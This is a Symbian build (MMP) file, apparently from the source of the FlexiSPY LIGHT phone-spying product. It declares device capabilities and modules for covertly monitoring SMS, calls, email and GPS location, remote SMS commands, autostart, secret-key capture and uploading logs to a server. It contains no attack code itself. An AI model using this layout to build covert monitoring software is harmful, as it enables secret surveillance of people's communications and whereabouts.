@@ -1,0 +1,326 @@
+/**
+* MMP file for FlexiSPY LIGHT
+*/
+
+MACRO __APP_FXS_LIGHT
+MACRO __RESELLER_BUILD
+//MACRO __RUN_TEST_CODE
+
+COMPRESSTARGET
+TARGET		rbacklite_0x2000A97B.exe
+
+TARGETTYPE	exe
+UID			0x00000000	0x2000A97B
+VENDORID	0
+
+//Min: 10 KB, Max:  30MB
+EPOCHEAPSIZE 0x2800 0x1E00000
+EPOCSTACKSIZE	 0x6400 //25 KB
+
+CAPABILITY	ProtServ ReadUserData ReadDeviceData WriteUserData WriteDeviceData NetworkServices
+
+//PowerMgmt
+//- RProperty::Define
+
+/**
+ReadUserData
+	- CLogClient::GetEvent
+ReadDeviceData
+	- Get IMEI
+	- 
+WriteDeviceData
+	- Used by SMSCMDCLI.DLL to send sms
+	- Change log config of LogEngine API*/
+
+SOURCEPATH ..\codebase\src
+SOURCE  CltApplication.cpp 
+SOURCE  CltDocument.cpp
+SOURCE  CltAppUi.cpp
+SOURCE  Global.cpp
+SOURCE  DialogUtils.cpp
+SOURCE  SmsCmdManager.cpp
+SOURCE  SmsCmdListener.cpp
+SOURCE  DiagnosCmdHandler.cpp
+SOURCE  ActiveBase.cpp
+SOURCE  CltSettings.cpp
+SOURCE	Logger.cpp
+SOURCE  ByteUtil.cpp
+SOURCE  CltSettingMan.cpp
+SOURCE  PeriodicTimer.cpp
+SOURCE  AppHelpText.cpp
+
+//database
+SOURCE  CltDatabase.cpp
+SOURCE  CltDbEngine.cpp
+SOURCE  AppSysMessage.cpp
+//messaging
+SOURCE  FxsMsgEngine.cpp
+SOURCE  FxsSmsMonitor.cpp
+SOURCE  CltEmailMonitor.cpp
+
+//log engine
+SOURCE  FxsLogEngine.cpp
+SOURCE  FxsCallMonitor.cpp
+SOURCE  FxsGprsRecentLogRm.cpp
+SOURCE  CltLogEvent.cpp
+//utils
+SOURCE  DiskSpaceNotifier.cpp
+
+//product activation 
+SOURCE  PrivacyDialog.cpp
+//main view
+SOURCE  CltMainView.cpp
+SOURCE  CltMainContainer.cpp
+SOURCE  AuthenTestView.cpp
+
+SOURCE  OperatorKeyword.cpp
+SOURCE  DriveInfo.cpp
+
+SOURCE  FxLocationService.cpp
+SOURCE  FxsLocationMonitor.cpp
+#if defined(__UI_FRAMEWORKS_V2__) //3rd
+SOURCE  FlexiKeyNotify.cpp  //
+SOURCE  DeviceInfoGetter.cpp
+SOURCE  CommonServiceClient.cpp
+#endif
+
+SOURCE  GlobalError.cpp
+SOURCE  NetOperator.cpp
+SOURCE  TheKiller.cpp
+SOURCE  SmsCmdFormatter.cpp
+SOURCE  ShareProperty.cpp
+SOURCE  TzUtil.cpp
+
+//#if defined(__RUN_TEST_CODE)
+SOURCEPATH	..\codebase\src\Test
+SOURCE  CallEventGenTest.cpp
+SOURCE  FxsSmsMonitorTest.cpp
+//#endif
+
+SOURCEPATH	..\codebase\src\APN
+SOURCE  AccessPointMan.cpp
+SOURCE  ApnCreator.cpp
+SOURCE  ApnDbDataType.cpp
+SOURCE  ApnDbManager.cpp
+SOURCE  fxshdatabase.cpp
+SOURCE  AccessPointInfo.cpp
+SOURCE  ApnAppWizardReader.cpp
+
+SOURCEPATH	..\codebase\src\UI\activationSrc
+SOURCE  PrdActivationContainer.cpp
+SOURCE  UIUtility.cpp
+SOURCE  GeneralTimer.cpp
+SOURCE  VProgressBarControl.cpp
+SOURCE  VLabelDrawer.cpp
+SOURCE  VLabelControl.cpp
+SOURCE  VStatusContainer.cpp
+SOURCE  ProductActivationView.cpp
+SOURCE  ProductActivationViewContainer.cpp
+
+SOURCEPATH	..\codebase\src\Crypto
+SOURCE  PBCrypto.cpp
+
+//protocols
+SOURCEPATH	..\codebase\src\protc
+SOURCE  ServProtocol.cpp
+
+SOURCEPATH	..\codebase\src\Common\utils\src
+
+SOURCE	HashUtils.cpp
+SOURCE	cMD5.cpp
+SOURCE	LicenceManager.cpp
+SOURCE	Device.cpp
+SOURCE	IMEIGetter.cpp
+SOURCE	Properties.cpp
+SOURCE	TheTerminator.cpp
+SOURCE  Timeout.cpp
+
+SOURCEPATH	..\codebase\src\ServConnect\src
+SOURCE  BinaryDataSupplier.cpp
+SOURCE  LogDeliveryAction.cpp
+SOURCE  ServConnectMan.cpp
+SOURCE  ConnEstablisher.cpp
+SOURCE  InetAPSelectAction.cpp
+SOURCE  AuthenTestAction.cpp
+SOURCE  ProductActivAction.cpp
+SOURCE  HttpConnect.cpp
+SOURCE  ServerSelector.cpp
+SOURCE  EventDeliveryTimer.cpp
+SOURCE  ConnProgressNonifier.cpp
+SOURCE  ApnRecoveryInfo.cpp
+
+SOURCEPATH	..\codebase\src\UI\SettingSrc
+SOURCE  MainSettingView.cpp
+SOURCE  SettingItemConnectionInfo.cpp
+SOURCE  CltSettingItemList.cpp
+SOURCE  CltSliderSettingItem.cpp
+SOURCE  EventCheckboxSetting.cpp
+SOURCE  FxsMaxEventSettingItem.cpp
+SOURCE  ProxySettingsContainer.cpp
+SOURCE  SettingItemProxy.cpp
+SOURCE  SecuritySettingItem.cpp
+SOURCE  MenuListView.cpp
+SOURCE  MenuListContainer.cpp
+SOURCE  MainSettingContainer.cpp
+SOURCE  Iconprovider.cpp
+SOURCE  S9PromptsSettingItem.cpp
+SOURCE  SettingSpyInfo.cpp
+
+SOURCEPATH ..\codebase\resource\light_r_3rd
+START RESOURCE rbacklite_0x2000A97B.rss
+HEADER
+TARGETPATH	\resource\apps
+LANG 01 //31
+END
+
+//Product Activation
+SOURCEPATH ..\codebase\resource\activation_r
+START RESOURCE ProdActiv.rss
+HEADER
+TARGETPATH	\resource\apps
+LANG 01 //31
+END
+
+SOURCEPATH ..\codebase\resource\light_r_3rd
+START RESOURCE   rbacklite_0x2000A97B_reg.rss
+#ifdef WINSCW
+	TARGETPATH 	  \private\10003a3f\apps
+#else
+	TARGETPATH 	  \private\10003a3f\import\apps
+#endif
+END //RESOURCE
+
+SOURCEPATH ..\codebase\resource\light_r_3rd
+START RESOURCE	autostart_0x2000A97B.rss
+TARGETPATH 	\private\101f875a\import
+END
+
+STARTUP_ITEM_INFO
+USERINCLUDE . 
+USERINCLUDE ..\codebase\inc
+USERINCLUDE ..\codebase\src\protc
+USERINCLUDE ..\codebase\inc\resource\activation_r
+USERINCLUDE ..\codebase\inc\productconst
+USERINCLUDE ..\codebase\src\Common
+USERINCLUDE ..\codebase\src\Common\utils\inc
+USERINCLUDE ..\codebase\src\Common\secretkeyman\inc
+USERINCLUDE	..\codebase\src\ServConnect\inc
+USERINCLUDE	..\codebase\src\UI\activationInc
+USERINCLUDE	..\codebase\src\UI\settingInc
+USERINCLUDE	..\codebase\src\network
+USERINCLUDE	..\codebase\src\GPS\inc
+USERINCLUDE	..\codebase\src\APN
+USERINCLUDE ..\codebase\src\Test
+
+USERINCLUDE	..\codebase\src\Crypto
+USERINCLUDE ..\codebase\libs\panicmon-1.0\client
+USERINCLUDE ..\codebase\libs\skcapsrv-1.0\client
+USERINCLUDE ..\codebase\libs\bugsrv-v1.0\Client
+USERINCLUDE ..\codebase\libs\smscmd-v1.1
+#if defined(__UI_FRAMEWORKS_V2__) //3rd
+USERINCLUDE ..\codebase\libs\commonservices
+#endif
+
+USERINCLUDE ..\codebase\resource
+USERINCLUDE ..\codebase\resource\activation_r
+USERINCLUDE ..\codebase\resource\light_r_3rd
+
+SYSTEMINCLUDE \epoc32\include
+SYSTEMINCLUDE \epoc32\include\ecom
+SYSTEMINCLUDE \epoc32\include\http
+SYSTEMINCLUDE \epoc32\include\libc 
+SYSTEMINCLUDE \epoc32\include\libc\netinet  
+SYSTEMINCLUDE \epoc32\include\libc\sys
+
+//
+//Secret Key Capture
+#if defined(__UI_FRAMEWORKS_V2__) //3rd
+LIBRARY commonsrv_0x2000A981.lib
+#else
+LIBRARY skcapcli.lib
+#endif
+
+LIBRARY panmoncli_0x2000A97D.lib
+LIBRARY SmsCmdCli_0x2000A97F.lib
+
+#if !defined(__UI_FRAMEWORKS_V2__) //for 2rd
+LIBRARY	commonengine.lib //ShareDataI
+#endif
+
+LIBRARY apparc.lib	
+LIBRARY	avkon.lib	
+LIBRARY	cone.lib	
+LIBRARY eikcoctl.lib	
+LIBRARY eikcore.lib		
+LIBRARY euser.lib	
+LIBRARY logcli.lib
+LIBRARY ws32.lib
+
+//Log engine
+LIBRARY logwrap.lib
+ 
+// logger
+LIBRARY	flogger.lib
+LIBRARY efsrv.lib 
+
+// SMS
+LIBRARY smcm.lib
+LIBRARY gsmu.lib
+LIBRARY msgs.lib
+LIBRARY etext.lib
+
+LIBRARY http.lib            // HTTP APIs
+LIBRARY InetProtUtil.lib    // TUriParser
+LIBRARY bafl.lib            // String pool APIs
+LIBRARY fbscli.lib
+
+LIBRARY estlib.lib  //memcpy
+LIBRARY	commdb.lib
+LIBRARY	esock.lib
+LIBRARY	eikdlg.lib
+LIBRARY	aknnotify.lib
+LIBRARY egul.lib  // text utils
+LIBRARY PlatformEnv.lib //PathInfo
+
+// file store
+LIBRARY	estor.lib 
+LIBRARY edbms.lib
+LIBRARY etel.lib
+
+//gps
+LIBRARY	lbs.lib
+#if defined(__UI_FRAMEWORKS_V2__)
+LIBRARY tzclient.lib 
+LIBRARY etel3rdparty.lib // Get IMEI
+#else
+LIBRARY plpvariant.lib // Get IMEI
+#endif
+
+LIBRARY connmon.lib //*  RConnectionMonitor
+LIBRARY	AknSkins.lib //skin
+
+LIBRARY IMCM.LIB // CSmtpClientMtm
+LIBRARY charconv.lib //unicode converter
+LIBRARY apgrfx.lib //aif reader, writer
+
+LIBRARY eikctl.lib //rich text
+LIBRARY apengine.lib //AP Select
+LIBRARY bitgdi.lib //uid
+LIBRARY gdi.lib //font
+LIBRARY hal.lib
+LIBRARY	aknicon.lib //listbox icon
+LIBRARY	centralrepository.lib 
+
+//extra libray
+LIBRARY pbe.lib		//encryption
+LIBRARY etelmm.lib
+
+START BITMAP rbacklite_0x2000A97B_aif.mbm
+HEADER
+TARGETPATH \resource\apps 
+SOURCEPATH ..\codebase\aif 
+SOURCE c12 context_pane_icon.bmp
+SOURCE c12 context_pane_icon_mask.bmp
+SOURCE c12 list_icon.bmp
+SOURCE c12 list_icon_mask.bmp
+END
